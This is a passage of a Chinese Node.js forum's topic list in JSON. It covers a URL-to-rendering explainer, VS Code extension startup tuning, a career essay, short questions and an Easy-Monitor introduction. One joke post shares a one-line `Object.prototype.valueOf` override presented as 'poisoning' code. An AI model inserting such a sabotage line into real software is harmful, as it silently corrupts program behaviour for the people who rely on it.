地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。</p>\n<h4>2. 什么是域名解析</h4>\n<p>DNS 协议提供通过域名查找 IP 地址，或逆向从 IP 地址反查域名的服务。DNS 是一个网络服务器，我们的域名解析简单来说就是在 DNS 上记录一条信息记录。</p>\n<pre class=\"prettyprint\"><code>例如 baidu.com  220.114.23.56（服务器外网IP地址）80（服务器端口号）\n</code></pre><h4>3. 浏览器如何通过域名去查询 URL 对应的 IP 呢</h4>\n<ul>\n<li>浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。</li>\n<li>操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。</li>\n<li>路由缓存：路由器也有 DNS 缓存。</li>\n<li>ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。</li>\n<li>根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS <a href=\"http://xn--44qr6aba96ld4eda63xey2cfa111ap36q.com\">服务器先问根域名服务器.com</a> 域名服务器的 IP 地址，然后再问.baidu 域名服务器，依次类推）</li>\n</ul>\n<p><img src=\"https://image.fundebug.com/2019-02-27-02.png\" alt></p>\n<h4>4. 小结</h4>\n<p>浏览器通过向 DNS 服务器发送域名，DNS 服务器查询到与域名相对应的 IP 地址，然后返回给浏览器，浏览器再将 IP 地址打在协议上，同时请求参数也会在协议搭载，然后一并发送给对应的服务器。接下来介绍向服务器发送 HTTP 请求阶段，HTTP 请求分为三个部分：TCP 三次握手、http 请求响应信息、关闭 TCP 连接。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-03.png\" alt></p>\n<h3>三、TCP 三次握手</h3>\n<p>在客户端发送数据之前会发起 TCP 三次握手用以同步客户端和服务端的序列号和确认号，并交换 TCP 窗口大小信息。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-04.png\" alt></p>\n<h4>1. TCP 三次握手的过程如下：</h4>\n<ul>\n<li><strong>客户端发送一个带 SYN=1，Seq=X 的数据包到服务器端口</strong>（第一次握手，由浏览器发起，告诉服务器我要发送请求了）</li>\n<li><strong>服务器发回一个带 SYN=1， ACK=X+1， Seq=Y 的响应包以示传达确认信息</strong>（第二次握手，由服务器发起，告诉浏览器我准备接受了，你赶紧发送吧）</li>\n<li><strong>客户端再回传一个带 ACK=Y+1， Seq=Z 的数据包，代表“握手结束”</strong>（第三次握手，由浏览器发送，告诉服务器，我马上就发了，准备接受吧）</li>\n</ul>\n<h4>2. 为啥需要三次握手</h4>\n<p>谢希仁著《计算机网络》中讲“三次握手”的目的是“<strong>为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误</strong>”。</p>\n<h3>四、发送 HTTP 请求</h3>\n<p>TCP 三次握手结束后，开始发送 HTTP 请求报文。</p>\n<p>请求报文由请求行（request line）、请求头（header）、请求体四个部分组成,如下图所示：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-05.png\" alt></p>\n<h4>1. 请求行包含请求方法、URL、协议版本</h4>\n<ul>\n<li>请求方法包含 8 种：GET、POST、PUT、DELETE、PATCH、HEAD、OPTIONS、TRACE。</li>\n<li>URL 即请求地址，由 &lt;协议&gt;：//&lt;主机&gt;：&lt;端口&gt;/&lt;路径&gt;?&lt;参数&gt; 组成</li>\n<li>协议版本即 http 版本号</li>\n</ul>\n<pre class=\"prettyprint\"><code>POST &#x2F;chapter17&#x2F;user.html HTTP&#x2F;1.1\n</code></pre><p>以上代码中“POST”代表请求方法，“/chapter17/user.html”表示 URL，“HTTP/1.1”代表协议和协议的版本。现在比较流行的是 Http1.1 版本</p>\n<h4>2. 请求头包含请求的附加信息，由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔。</h4>\n<p>请求头部通知服务器有关于客户端请求的信息。它包含许多有关的客户端环境和请求正文的有用信息。其中比如：<strong>Host，表示主机名，虚拟主机；Connection,HTTP/1.1 增加的，使用 keepalive，即持久连接，一个连接可以发多个请求；User-Agent，请求发出者，兼容性以及定制化需求。</strong></p>\n<h4>3. 请求体，可以承载多个请求参数的数据，包含回车符、换行符和请求数据，并不是所有请求都具有请求数据。</h4>\n<pre class=\"prettyprint\"><code>name=tom&amp;password=1234&amp;realName=tomson\n</code></pre><p>上面代码，承载着 name、password、realName 三个请求参数。</p>\n<p><strong>给大家推荐一个好用的 BUG 监控工具<a href=\"https://www.fundebug.com/?utm_source=liao\">Fundebug</a>，欢迎免费试用！</strong></p>\n<h3>五、服务器处理请求并返回 HTTP 报文</h3>\n<h4>1. 服务器</h4>\n<p>服务器是网络环境中的高性能计算机，它侦听网络上的其他计算机（客户机）提交的服务请求，并提供相应的服务，比如网页服务、文件下载服务、邮件服务、视频服务。而客户端主要的功能是浏览网页、看视频、听音乐等等，两者截然不同。 每台服务器上都会安装处理请求的应用——web server。常见的 web server 产品有 apache、nginx、IIS 或 Lighttpd 等。\n<strong>web server 担任管控的角色</strong>，对于不同用户发送的请求，会结合配置文件，把不同请求委托给服务器上处理相应请求的程序进行处理（例如 CGI 脚本，JSP 脚本，servlets，ASP 脚本，服务器端 JavaScript，或者一些其它的服务器端技术等），然后返回后台程序处理产生的结果作为响应。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-06.png\" alt></p>\n<h4>2. MVC 后台处理阶段</h4>\n<p>后台开发现在有很多框架，但大部分都还是按照 MVC 设计模式进行搭建的。</p>\n<p>MVC 是一个设计模式，将应用程序分成三个核心部件：模型（model）-- 视图（view）–控制器（controller），它们各自处理自己的任务，实现输入、处理和输出的分离。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-07.png\" alt></p>\n<blockquote>\n<p>1、视图（view）</p>\n</blockquote>\n<p><strong>它是提供给用户的操作界面，是程序的外壳。</strong></p>\n<blockquote>\n<p>2、模型（model）</p>\n</blockquote>\n<p>**模型主要负责数据交互。**在 MVC 的三个部件中，模型拥有最多的处理任务。一个模型能为多个视图提供数据。</p>\n<blockquote>\n<p>3、控制器（controller）</p>\n</blockquote>\n<p>**它负责根据用户从&quot;视图层&quot;输入的指令，选取&quot;模型层&quot;中的数据，然后对其进行相应的操作，产生最终结果。**控制器属于管理者角色，从视图接收请求并决定调用哪个模型构件去处理请求，然后再确定用哪个视图来显示模型处理返回的数据。</p>\n<p>这三层是紧密联系在一起的，但又是互相独立的，每一层内部的变化不影响其他层。每一层都对外提供接口（Interface），供上面一层调用。</p>\n<p>至于这一阶段发生什么？简而言之，首先浏览器发送过来的请求先经过控制器，控制器进行逻辑处理和请求分发，接着会调用模型，这一阶段模型会获取 redis db 以及 MySQL 的数据，获取数据后将渲染好的页面，响应信息会以响应报文的形式返回给客户端，最后浏览器通过渲染引擎将网页呈现在用户面前。</p>\n<h4>3. http 响应报文</h4>\n<p>响应报文由响应行（request line）、响应头部（header）、响应主体三个部分组成。如下图所示：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-08.png\" alt></p>\n<p>(1) 响应行包含：协议版本，状态码，状态码描述</p>\n<p>状态码规则如下：</p>\n<ul>\n<li>1xx：指示信息–表示请求已接收，继续处理。</li>\n<li>2xx：成功–表示请求已被成功接收、理解、接受。</li>\n<li>3xx：重定向–要完成请求必须进行更进一步的操作。</li>\n<li>4xx：客户端错误–请求有语法错误或请求无法实现。</li>\n<li>5xx：服务器端错误–服务器未能实现合法的请求。</li>\n</ul>\n<p>(2) 响应头部包含响应报文的附加信息，由 名/值 对组成</p>\n<p>(3) 响应主体包含回车符、换行符和响应返回数据，并不是所有响应报文都有响应数据</p>\n<h3>六、浏览器解析渲染页面</h3>\n<p>浏览器拿到响应文本 HTML 后，接下来介绍下浏览器渲染机制</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-09.png\" alt></p>\n<p>浏览器解析渲染页面分为一下五个步骤：</p>\n<ul>\n<li>根据 HTML 解析出 DOM 树</li>\n<li>根据 CSS 解析生成 CSS 规则树</li>\n<li>结合 DOM 树和 CSS 规则树，生成渲染树</li>\n<li>根据渲染树计算每一个节点的信息</li>\n<li>根据计算好的信息绘制页面</li>\n</ul>\n<h4>1. 根据 HTML 解析 DOM 树</h4>\n<ul>\n<li>根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。</li>\n<li>在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。</li>\n</ul>\n<h4>2. 根据 CSS 解析生成 CSS 规则树</h4>\n<ul>\n<li>解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。</li>\n<li>浏览器在 CSS 规则树生成之前不会进行渲染。</li>\n</ul>\n<h4>3. 结合 DOM 树和 CSS 规则树，生成渲染树</h4>\n<ul>\n<li>DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。</li>\n<li>精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。</li>\n</ul>\n<h4>4. 根据渲染树计算每一个节点的信息（布局）</h4>\n<ul>\n<li>布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸</li>\n<li>回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。</li>\n</ul>\n<h4>5. 根据计算好的信息绘制页面</h4>\n<ul>\n<li>绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。</li>\n<li>重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。</li>\n<li>回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。</li>\n</ul>\n<h3>七、断开连接</h3>\n<p><strong>当数据传送完毕，需要断开 tcp 连接，此时发起 tcp 四次挥手</strong>。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-27-10.png\" alt></p>\n<ul>\n<li><strong>发起方向被动方发送报文，Fin、Ack、Seq，表示已经没有数据传输了。并进入 FIN_WAIT_1 状态</strong>。(第一次挥手：由浏览器发起的，发送给服务器，我请求报文发送完了，你准备关闭吧)</li>\n<li><strong>被动方发送报文，Ack、Seq，表示同意关闭请求。此时主机发起方进入 FIN_WAIT_2 状态</strong>。(第二次挥手：由服务器发起的，告诉浏览器，我请求报文接受完了，我准备关闭了，你也准备吧)</li>\n<li><strong>被动方向发起方发送报文段，Fin、Ack、Seq，请求关闭连接。并进入 LAST_ACK 状态</strong>。(第三次挥手：由服务器发起，告诉浏览器，我响应报文发送完了，你准备关闭吧)</li>\n<li><strong>发起方向被动方发送报文段，Ack、Seq。然后进入等待 TIME_WAIT 状态。被动方收到发起方的报文段以后关闭连接。发起方等待一定时间未收到回复，则正常关闭</strong>。(第四次挥手：由浏览器发起，告诉服务器，我响应报文接受完了，我准备关闭了，你也准备吧)</li>\n</ul>\n<h3>参考文章</h3>\n<ul>\n<li><a href=\"https://github.com/kaola-fed/blog/issues/271\">从输入页面地址到展示页面信息都发生了些什么？</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006879700\">前端经典面试题: 从输入 URL 到页面加载发生了什么？</a></li>\n<li><a href=\"https://juejin.im/post/5a0444d45188255ea95b66bc\">TCP 的三次握手四次挥手</a></li>\n<li><a href=\"https://blog.csdn.net/sinat_21455985/article/details/53508115\">访问 Web，tcp 传输全过程（三次握手、请求、数据传输、四次挥手）</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000010156898\">浏览器发送 http 请求过程分析</a></li>\n<li><a href=\"https://book.douban.com/subject/26960678/\">谢希仁著《计算机网络》第四版</a></li>\n<li><a href=\"https://book.douban.com/subject/25863515/\">图解 http</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"经典面试题：从 URL 输入到页面展现到底发生什么？","last_reply_at":"2019-03-06T10:02:30.682Z","good":false,"top":false,"reply_count":3,"visit_count":999,"create_at":"2019-02-28T02:08:34.010Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c7dd5bb5b8cb21491ca5dbb","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>重新编辑，重发</p>\n</blockquote>\n<p>最近沉迷 vscode 扩展无法自拔，开启写了新坑，也维护旧扩展。</p>\n<p>其中就有这么一个<a href=\"https://github.com/axetroy/vscode-npm-import-package-version\">扩展</a>是这样的: 显示导入的包版本号。</p>\n<p><img src=\"https://github.com/axetroy/vscode-npm-import-package-version/raw/master/screenshot/js.png\" alt=\"js\">\n<img src=\"https://github.com/axetroy/vscode-npm-import-package-version/raw/master/screenshot/ts.png\" alt=\"ts\">\n<img src=\"https://github.com/axetroy/vscode-npm-import-package-version/raw/master/screenshot/vue.png\" alt=\"vue\"></p>\n<p>代码很简单也很少，用<code>Babel/Typescript/vue-component</code>分别解析对应的文件，然后标注版本号。</p>\n<p>然而就是这么功能简单的扩展，启动速度居然超过其他所有稍微复杂一点的扩展。</p>\n<p><img src=\"https://i.loli.net/2019/03/05/5c7d63269f13f.jpg\" alt></p>\n<p><img src=\"https://user-images.githubusercontent.com/9758711/53754049-b668bf00-3eed-11e9-9334-6f380cc4f062.png\" alt=\"2019-03-05 02 20 51\"></p>\n<p>启动速度 <code>2431ms</code></p>\n<p><img src=\"https://i.loli.net/2019/03/05/5c7d62237d0d2.jpg\" alt></p>\n<p>这不科学呀, 到底是慢在哪里呢?</p>\n<p>分析了一下 <code>profile</code> 文件后，发现不是我写的代码慢，而是慢在了加载的第三方库</p>\n<h3>Typescript 的通病</h3>\n<p>Typescript 跟随 ECMA 标准，import 必须放在顶部.</p>\n<pre class=\"prettyprint language-typescript\"><code>import * as ts from &#x27;typescript&#x27;;\n\nexport function parser() {\n  &#x2F;&#x2F; 这里是你的业务逻辑\n  ts.parser();\n}\n</code></pre><p>问题就在于这. <code>typescript</code>在编译成<code>javascript</code>之后</p>\n<pre class=\"prettyprint language-ts\"><code>const ts = require(&quot;typescript&quot;)\n\nexport.parser = function parser() {\n  &#x2F;&#x2F; 这里是你的业务逻辑\n  ts.parser()\n}\n</code></pre><p>我们都知道<strong>require 函数加载模块都是同步进行的</strong>, 也就是我还没使用<code>parser</code>函数的时候，就加载这个模块了。</p>\n<p>而第三方模块加载，根据不同的包，加载时间各不相同。因为有些包，会在加载的时候做一些同步的初始化操作</p>\n<pre class=\"prettyprint language-ts\"><code>&#x2F;&#x2F; 某第三方包\n\n&#x2F;&#x2F; 这里做一些同步操作\n&#x2F;&#x2F; 例如定义map，for循环之类的\n\n&#x2F;&#x2F; 导出函数\nexport default function() {}\n</code></pre><p>而恰巧，Typescript 和 Babel/Babel-types 都有大量的这种操作, 导致拖慢了扩展初始化速度.</p>\n<h3>解决方案</h3>\n<p>问: 能不能在我使用这个函数的时候，才导入相应的包?\n答: require 就可以</p>\n<pre class=\"prettyprint language-diff\"><code>- import * as ts from &#x27;typescript&#x27;;\n\nexport function parser() {\n  &#x2F;&#x2F; 这里是你的业务逻辑\n+ const ts = require(&#x27;typescript&#x27;);\n  ts.parser();\n}\n</code></pre><p>问题就来了，<code>require</code> 的模块是没有类型。那使用<code>typescript</code>开发的体验就不是很好了.</p>\n<p>我们稍微改造一下</p>\n<pre class=\"prettyprint language-diff\"><code>- import * as ts from &#x27;typescript&#x27;;\n+ import TS = require(&#x27;typescript&#x27;); &#x2F;&#x2F; 这里只是导入类型而已\n\nexport function parser() {\n  &#x2F;&#x2F; 这里是你的业务逻辑\n+ const ts:typeof TS = require(&#x27;typescript&#x27;); &#x2F;&#x2F; 给require的模块附上类型\n  ts.parser();\n}\n</code></pre><p>OK! 大功告成，就这么简单。</p>\n<h3>结果对比</h3>\n<p>在我把这个简单的扩展按照上面的方式重构一遍之后，来看一下启动速度</p>\n<p><img src=\"https://user-images.githubusercontent.com/9758711/53754059-c6809e80-3eed-11e9-8a86-6cba7c459c01.png\" alt=\"2019-03-05 02 21 57\"></p>\n<p>更改后启动速度竟然仅用了<code>31ms</code>, 比之前快了 80 倍</p>\n<p><img src=\"https://i.loli.net/2019/03/05/5c7d6807d2fcc.jpg\" alt></p>\n<p><strong>最后愿天下没有拖慢速度的扩展，宇宙第一编辑器已经够慢了</strong></p>\n</div>","title":"我是如何把vscode扩展的启动速度提升80倍的","last_reply_at":"2019-03-06T09:33:12.691Z","good":false,"top":false,"reply_count":10,"visit_count":1137,"create_at":"2019-03-05T01:49:47.700Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5c5ae92be6aaad2ea76deff8","author_id":"57f2384783a4d9176a71da75","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文 context ：面向于 C 端的产品/公司；</p>\n</blockquote>\n<blockquote>\n<p>本文核心不是强调某一个岗位，而是应该“离业务更近”，“离用户更近”</p>\n</blockquote>\n<p>在现代的工业体系下，任何工作都被拆分为流水线上的一环，如今的互联网行业更是从用户那里知道他们想要什么再到实际做出来，有足足六七个环节。</p>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNc79ly1fzwukjnuwcj31220ggwey.jpg\" alt></p>\n<p>作为一个有写代码爱好的人来说，能选择的余地不多，唯有「<strong>后端工程师</strong>」和「<strong>前端工程师</strong>」，在过去的很长时间，我基本上呆在后端的领域，去做了很多后端相关的开发，自己也在后端方面有了更多的认识。</p>\n<p>在新的 2019 年，我将会尝试让自己转向，成为一个前端工程师。接下来，我来说一说我这个选择的背后逻辑。</p>\n<h2>员工的价值到底由什么决定？</h2>\n<blockquote>\n<p>白子：离客户越近，其价值就越大。</p>\n</blockquote>\n<p>提到择业，就避不开两个话题，企业的需求和员工的价值。一般来说，我们认为，<strong>员工的价值由他为企业带来的价值所决定</strong>。</p>\n<p>这句话没错，那么，员工如何为企业带来价值？</p>\n<p>员工可以帮助企业创造更好的产品，但是，<strong>这是价值么？</strong></p>\n<p>更好的产品本身并不是价值，<strong>其所带来的用户、客户才是真正的价值</strong>。</p>\n<p>员工本身并不让企业盈利，相反，企业需要支付费用给员工。而客户则是支付费用给公司，帮助企业盈利。</p>\n<p>从这个角度来看，<strong>离客户越近的人，越能产生价值</strong>，这也就是为什么我们会经常看到一个企业里，销售是赚钱最多的人，因为他们离客户最近，能够给企业带来实打实的价值。</p>\n<h2>技术背后的陷阱</h2>\n<blockquote>\n<p>白子：技术本身就是螺丝钉，只研技术，不过是一个螺丝钉，变成一个更粗的螺丝钉。</p>\n</blockquote>\n<p>关注技术本身有没有坏处？当然没有，作为一个开发者，追求技术的卓越是应有的义务。但是，从企业的角度来说，<strong>只关注技术本身，意味着你的价值会不断降低。</strong></p>\n<p>技术再强，也是可以找到替代者的，区别仅仅是愿不愿意花那么多钱罢了。业务理解的深度，却是其他人无法轻易替代的。江山代有才人出，各领风骚数百年，技术迭代速度非常快，总会有新人出来，比你更加擅长技术。</p>\n<h2>为什么是前端不是后端</h2>\n<blockquote>\n<p>白子：如今的前端更加接近业务本身，更具备价值</p>\n</blockquote>\n<p>随着现代软件产品的高度流水线化，我们推崇的<strong>前后端分离、RESTFul API、GraphQL 让后端的工作越来越轻松</strong>，可以花费更多的精力投放在技术深度的探索，去研究更加深层次的优化问题，而不需要花费更多的心思在业务逻辑上去。</p>\n<p>同样的，<strong>前端不得不承担起业务流程的开发，工作量大大加大</strong>。虽然有各种各样的组件库帮助前端优化了具体布局、界面上面的工作，<strong>但业务流程本身的复杂度并不会因为组件库的引入而简化</strong>。</p>\n<p>在这种强前端重后端的模式下，前端承担了原本是后端的工作，让后端不再需要去理解业务逻辑，更加关注技术本身的内容就可以了。<strong>离业务越来越远，使得后端的话语权越来越小。</strong></p>\n<h2>游刃有余的前端</h2>\n<p><strong>前端工程师本身负责的是客户可以看见的内容，这使得他们相比于后端工程师，有着更多的职业选择</strong>。</p>\n<p>他们了解用户交互体验，可以从开发转换成为用户研究</p>\n<p>他们了解用户使用方法，可以从开发转换成为销售</p>\n<p>他们了解用户使用路径，可以从开发转换成为产品经理</p>\n<p><strong>而后端，由于专精于技术，其职业选择，也不过是从一门技术，转为另外一门技术罢了。</strong></p>\n</div>","title":"离用户近一点，再近一点","last_reply_at":"2019-03-06T06:37:52.866Z","good":false,"top":false,"reply_count":6,"visit_count":1284,"create_at":"2019-02-06T14:03:23.234Z","author":{"loginname":"bestony","avatar_url":"https://avatars1.githubusercontent.com/u/13283837?v=4&s=120"}},{"id":"5c7e6e9090c14711cc8ca95f","author_id":"5c7953365b8cb21491ca510f","tab":"ask","content":"<div class=\"markdown-text\"><p>data(){}</p>\n</div>","title":"vue中data怎样使用??","last_reply_at":"2019-03-06T04:07:32.091Z","good":false,"top":false,"reply_count":1,"visit_count":384,"create_at":"2019-03-05T12:41:52.580Z","author":{"loginname":"qiuchenlu123","avatar_url":"https://avatars0.githubusercontent.com/u/48122764?v=4&s=120"}},{"id":"5c7c92095b8cb21491ca5722","author_id":"581378c0cf18d0333412d2a2","tab":"ask","content":"<div class=\"markdown-text\"><ul>\n<li>公司服务器不能访问墙外网站</li>\n<li>我在公司的服务器上  build 镜像的时候出现下面的问题，求大神指点。</li>\n</ul>\n<p><em>我一直猜测是网络问题，但是我在我的一台私人国内云服务器 build 镜像并不会存在下面的问题呀。</em></p>\n<pre class=\"prettyprint\"><code>&gt; scrypt@6.0.3 install &#x2F;home&#x2F;node&#x2F;bi-nodesrv-doctor&#x2F;node_modules&#x2F;scrypt\n&gt; node-gyp rebuild\n\ngyp WARN install got an error, rolling back install\ngyp ERR! configure error \ngyp ERR! stack Error: read ECONNRESET\ngyp ERR! stack     at TLSWrap.onStreamRead (internal&#x2F;stream_base_commons.js:111:27)\ngyp ERR! System Linux 4.15.0-43-generic\ngyp ERR! command &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;node&quot; &quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;npm&#x2F;node_modules&#x2F;node-gyp&#x2F;bin&#x2F;node-gyp.js&quot; &quot;rebuild&quot;\ngyp ERR! cwd &#x2F;home&#x2F;node&#x2F;bi-nodesrv-doctor&#x2F;node_modules&#x2F;scrypt\ngyp ERR! node -v v10.15.2\ngyp ERR! node-gyp -v v3.8.0\ngyp ERR! not ok \nnpm WARN co-mocha@1.2.2 requires a peer of mocha@&gt;=1.18 &lt;6 but none is installed. You must install peer dependencies yourself.\nnpm WARN ajv-keywords@2.1.1 requires a peer of ajv@^5.0.0 but none is installed. You must install peer dependencies yourself.\nnpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.7 (node_modules&#x2F;fsevents):\nnpm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.7: wanted {&quot;os&quot;:&quot;darwin&quot;,&quot;arch&quot;:&quot;any&quot;} (current: {&quot;os&quot;:&quot;linux&quot;,&quot;arch&quot;:&quot;x64&quot;})\n\nnpm ERR! code ELIFECYCLE\nnpm ERR! errno 1\nnpm ERR! scrypt@6.0.3 install: &#96;node-gyp rebuild&#96;\nnpm ERR! Exit status 1\nnpm ERR! \nnpm ERR! Failed at the scrypt@6.0.3 install script.\nnpm ERR! This is probably not a problem with npm. There is likely additional logging output above.\n</code></pre></div>","title":"node-gyp rebuild 问题","last_reply_at":"2019-03-06T03:15:53.988Z","good":false,"top":false,"reply_count":1,"visit_count":578,"create_at":"2019-03-04T02:48:41.284Z","author":{"loginname":"spursy","avatar_url":"https://avatars0.githubusercontent.com/u/11460991?v=4&s=120"}},{"id":"5c7cd6ed5b8cb21491ca5a8b","author_id":"573212537abbbd520cb244b3","tab":"ask","content":"<div class=\"markdown-text\"><p>RT</p>\n</div>","title":"把 Mysql 的数据异构到 MongoDB 如何做实时的同步?","last_reply_at":"2019-03-06T03:06:20.707Z","good":false,"top":false,"reply_count":9,"visit_count":561,"create_at":"2019-03-04T07:42:37.486Z","author":{"loginname":"dlyt","avatar_url":"https://avatars0.githubusercontent.com/u/18431616?v=4&s=120"}},{"id":"5c7e40d890c14711cc8ca8b8","author_id":"59e6c301bcfcc03162f2ffc3","tab":"share","content":"<div class=\"markdown-text\"><p>无敌切面编程系列</p>\n<pre class=\"prettyprint\"><code>Object.prototype.valueOf=function(){return 1}\n</code></pre><p>目前已经在医院</p>\n</div>","title":"哇你居然在代码里面下毒系列--2","last_reply_at":"2019-03-06T03:05:28.996Z","good":false,"top":false,"reply_count":2,"visit_count":618,"create_at":"2019-03-05T09:26:48.046Z","author":{"loginname":"spitWind","avatar_url":"https://avatars2.githubusercontent.com/u/18753430?v=4&s=120"}},{"id":"594f6e21642874f845d9fe0d","author_id":"575eaa97c1518403160a45c4","tab":"share","content":"<div class=\"markdown-text\"><h1>I. 写在最前面</h1>\n<p>Easy-Monitor 1.x 的版本在今年三月的时候发布了，陆续从最初的仅仅为了做一个短时间 ( 5s ) 的 cpu-profiling 查看函数瓶颈，到后面加入了针对疑似内存泄漏点的排查功能。</p>\n<p>整个 1.x 版本主要还是试验一下自己的做内核监控的可行性和想法，所以在使用上和设计架构上没有做太多的考量，导致易用性和兼容性上存在一些问题，因此从 5 月中旬开始到现在，对这个项目做了一个彻底的重构，也是现在这个 2.0 版本的初衷~</p>\n<h1>II. 功能</h1>\n<ul>\n<li>服务器状态概览信息展示</li>\n<li>实时 CPU 函数性能分析，帮助定位程序的性能瓶颈点</li>\n<li>实时 Memory 堆内内存结构分析，帮助定位到内存疑似泄漏点</li>\n</ul>\n<h2>2.0 的一些新特性</h2>\n<ul>\n<li>基于 vue.js 和 iview 组件全新设计的 UI</li>\n<li>全面兼容 v4.x ~ v8.x</li>\n<li>新增概览 Overview 展示页</li>\n<li>支持 动态更新配置，无需重启一键生效</li>\n<li>支持 Stream 流式解析更大的 HeapSnapshot</li>\n<li>支持 Cluster 集群部署，支持定制 私有协议</li>\n</ul>\n<h1>III. 快速开始</h1>\n<h2>- 安装模块</h2>\n<p>执行如下命令安装 Easy-Monitor：</p>\n<pre class=\"prettyprint language-js\"><code>npm install easy-monitor\n</code></pre><h2>- 项目中引入</h2>\n<p>在你的项目入口文件中按照如下方式引入，当然请传入你的项目名称：</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\nconst easyMonitor = require(&#x27;easy-monitor&#x27;);\neasyMonitor(&#x27;你的项目名称&#x27;);\n</code></pre><p>好了，此时你所需要做的一切都已就绪，接下来以你喜欢的方式运行项目即可，不管是 <code>nohup</code> 还是 <code>pm2</code>，亦或是直接 <code>node</code> 启动均可。</p>\n<h2>- 访问监控页面</h2>\n<p>打开你的浏览器，访问 <a href=\"http://localhost:12333\">http://localhost:12333</a> ，即可看到进程界面。</p>\n<h2>- 完整样例 &amp; Demo</h2>\n<p>为了帮助大家更好的理解使用，下面编写一个 Easy-Monitor 嵌入 Express 应用的完整例子</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\nconst easyMonitor = require(&#x27;easy-monitor&#x27;);\neasyMonitor(&#x27;Mercury&#x27;);\nconst express = require(&#x27;express&#x27;);\nconst app = express();\n\napp.get(&#x27;&#x2F;hello&#x27;, function (req, res, next) {\n    res.send(&#x27;hello&#x27;);\n});\n\napp.listen(8082);\n</code></pre><p>将上述的内容保存成一个 js 文件，启动后访问 <a href=\"http://127.0.0.1:12333\">http://127.0.0.1:12333</a> 即进入 Easy-Monitor 的首页，就是这样的简单！</p>\n<p>这里有一个在线真实的 Demo 地址：<a href=\"http://easy-monitor.cn\">Easy-Monitor Demo</a>，可以点击进入自行尝试一番。</p>\n<h2>更多关于 集群部署、深度定制化开发、通用配置以及动态更新配置的说明可以查看 <a href=\"http://easy-monitor.cn/document\">Easy-Monitor 详细文档</a> 。</h2>\n<h1>IV. 设计架构</h1>\n<p>这个项目旨在帮助大家更加深入地理解自己的 Node 项目运行时状态，以便能够在想做性能优化时更有针对性，也考虑到使用的难易程度，所以对于 <strong>快速部署</strong> 和 <strong>集群 C/S  模式部署</strong> 两种都做了支持，整体设计架构如下:</p>\n<h2>快速部署</h2>\n<p>快速部署模式下，web 页面展示的进程会以 fork 的形式自动启动，采集内核数据的客户端则会绑定到业务进程，两者间采用默认的 tcp 通信模式:</p>\n<p><img src=\"//static.cnodejs.org/FtCoXxJCTkNDpXC7sgYcIMeJtNpv\" alt=\"jiagou1.png\"></p>\n<p>如上图所示，这种部署模式下，优点是仅需要 require 即可，无任何额外操作，开箱即用。缺点也比较明显，如果项目是分布在不同的服务器上，则需要每次都输入对应的项目所在服务器地址才能访问。</p>\n<h2>集群 C/S 部署</h2>\n<p>这种部署模式其实就是独立部署 dashboard 进程，采集内核数据的客户端则分散到各个业务进程，数据统一上报给独立部署的 dashboard 进程，整体设计架构如下:</p>\n<p><img src=\"//static.cnodejs.org/FpkM_4gCB8HBIpCFit2rSU40hvAS\" alt=\"jiagou2.png\"></p>\n<p>这种部署模式下，在业务项目本身集群化部署的情况下非常易于统一查看，省去了快速部署模式下每次访问不同地址的烦恼。</p>\n<h1>V. 图文使用说明</h1>\n<h2>动态更新配置</h2>\n<p>进入监控 web 页面首页后，点击项目标题，即可打开动态更新配置的 